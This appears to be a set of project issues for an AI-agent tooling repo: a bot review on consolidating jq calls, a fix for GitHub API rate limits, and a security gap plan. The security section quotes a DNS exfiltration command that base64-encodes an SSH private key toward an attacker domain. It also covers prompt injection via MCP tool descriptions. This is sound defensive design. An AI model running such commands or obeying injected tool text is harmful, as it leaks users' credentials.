## Unactioned Review Feedback

**Source PR**: #3997
**File**: `.agents/scripts/screen-time-helper.sh`
**Reviewers**: gemini
**Findings**: 1
**Max severity**: medium

---

### MEDIUM: gemini (gemini-code-assist[bot])
**File**: `.agents/scripts/screen-time-helper.sh:714`
![medium](https://www.gstatic.com/codereviewagent/medium-priority.svg)

To improve performance and script efficiency, it's best to consolidate the multiple `jq` calls that read from `$HISTORY_FILE` into a single pass. You can compute all the necessary historical statistics (1-day, 7-day, 28-day, 365-day, and total) in one `jq` invocation and then read them into shell variables. This avoids reading and parsing the same file multiple times, which is especially beneficial if the history file grows large.

```shell
 local history_days=0 history_total=0
 local hist_1d=0 hist_7d=0 hist_28d=0 hist_365d=0
 if [[ -f "$HISTORY_FILE" ]]; then
  history_days=$(wc -l <"$HISTORY_FILE" | tr -d ' ')
  if [[ "$history_days" -gt 0 ]]; then
   # Read all history stats in one jq call for efficiency
   local history_stats
   history_stats=$(jq -s '
    . as $all |
    [
     ([$all[].screen_hours] | add // 0),
     ([$all[-1:][].screen_hours] | add // 0 | . * 10 | round / 10),
     ([$all[-7:][].screen_hours] | add // 0 | . * 10 | round / 10),
     ([$all[-28:][].screen_hours] | add // 0 | . * 10 | round / 10),
     ([$all[-365:][].screen_hours] | add // 0 | . * 10 | round / 10)
    ] | @tsv
   ' "$HISTORY_FILE" 2>/dev/null)

   # shellcheck disable=SC2086
   read -r history_total hist_1d hist_7d hist_28d hist_365d <<<"$history_stats"
  fi
 fi

 # If live 7d/28d returned 0 but we have history, use history instead
 if [[ "$history_days" -gt 0 ]]; then
  if [[ "$(echo "$week_hours == 0" | bc)" -eq 1 ]]; then
   week_hours="${hist_7d:-0}"
  fi
  if [[ "$(echo "$month_hours == 0" | bc)" -eq 1 ]]; then
   month_hours="${hist_28d:-0}"
  fi
  if [[ "$(echo "$day_hours == 0" | bc)" -eq 1 ]]; then
   day_hours="${hist_1d:-0}"
  fi
 fi

 # For 365 days: use accumulated history if available, else extrapolate
 local year_hours
 if [[ "$history_days" -gt 0 ]]; then
  local daily_avg
  daily_avg=$(echo "scale=2; ${history_total:-0} / $history_days" | bc)
  if [[ "$history_days" -ge 365 ]]; then
   # Have a full year of data — use last 365 days from history
   year_hours="${hist_365d:-0}"
  else
   # Extrapolate from available data
   year_hours=$(echo "scale=1; $daily_avg * 365" | bc)
  fi
```

<details>
<summary>References</summary>

1. Consolidate multiple 'jq' calls into a single pass where possible to improve performance and script efficiency.
</details>

title: t1425: Add flock process locking to pulse-wrapper to prevent zombie accumulation
t1426: Cache person_stats hourly to eliminate Search API rate limit exhaustion
body:
## Problem

`update_health_issues()` runs every pulse (every 2 min) and calls `person-stats` + `cross-repo-person-stats` each time. These make 4 GitHub Search API calls per contributor (issues created, PRs created, PRs merged, commented on).

With 2 repos and ~5 unique contributors: 44 Search API calls per pulse vs 30/min limit. The function sleeps 56s waiting for reset, blocking the pulse cycle. Combined with the PID race (t1425), this created 18+ zombie processes.

The data — "who created how many issues/PRs in the last 30 days" — changes at most hourly.

## Fix

Add `_refresh_person_stats_cache()` with a 1-hour timestamp guard. Results cached to `~/.aidevops/logs/person-stats-cache-*.md`. `update_health_issues()` and `_update_health_issue_for_repo()` read from cache instead of computing live.

Reduces Search API usage from ~1320/hr to ~44/hr. Removes need for rate limit guards.

## Files

- `.agents/scripts/pulse-wrapper.sh` — add `_refresh_person_stats_cache()`, update callers to read cache

title: t1428: Grith-inspired security enhancements — composite scoring, quarantine digest, MCP description audit, DNS exfil detection, session summary
body:
## Summary

Gap analysis of aidevops security stack against [Grith.ai](https://grith.ai)'s zero-trust AI agent security model identified 5 genuine gaps after deep audit of existing capabilities (~20 security files reviewed).

**What we already cover well (no gap):** prompt injection detection (70+ patterns + LLM classifier), MCP tool poisoning awareness (mcporter.md security section), network egress controls (5-tier, 222 domains), tamper-evident audit trail (hash-chained JSONL), worker credential isolation, skill supply chain scanning, CI/CD AI agent security guidance, privacy filter, terminal security.

## 5 Genuine Gaps

### t1428.1 — DNS exfiltration detection (~2h)
CVE-2025-55284 demonstrated `dig $(cat ~/.ssh/id_rsa | base64).attacker.com` bypasses network allowlists. Our Tier 5 blocks known DNS exfil services but not attacker-owned domains. Add patterns to `prompt-injection-patterns.yaml` and `sandbox-exec-helper.sh` for DNS exfil command shapes.

### t1428.2 — MCP tool description runtime scanning (~3h)
We scan tool outputs (Pattern B) and source code (skill-scanner at import), but not tool descriptions at runtime. Descriptions enter model context as trusted instructions. Create `mcp-audit-helper.sh` that fetches tool descriptions via `mcporter list --json` and runs `prompt-guard-helper.sh scan` on each.

### t1428.3 — Session-scoped composite security scoring (~5h)
Binary allow/block per-check but no multi-signal accumulation. No correlation between "session read sensitive file" and "session making outbound request." Add session security context that accumulates signals across operations for lightweight taint tracking.

### t1428.4 — Quarantine digest with learn feedback (~5h)
Flagged items go to separate logs nobody reviews. Create unified quarantine queue with approve/deny/learn actions. "Learn" feeds back into `network-tiers-custom.conf` or `prompt-guard-custom.txt`, creating a self-improving feedback loop.

### t1428.5 — Unified post-session security summary (~3h)
Data exists across 4+ separate commands but no single view. Enhance `session-review-helper.sh` with `--security` mode aggregating cost, security events, flagged domains, quarantine items.

## References
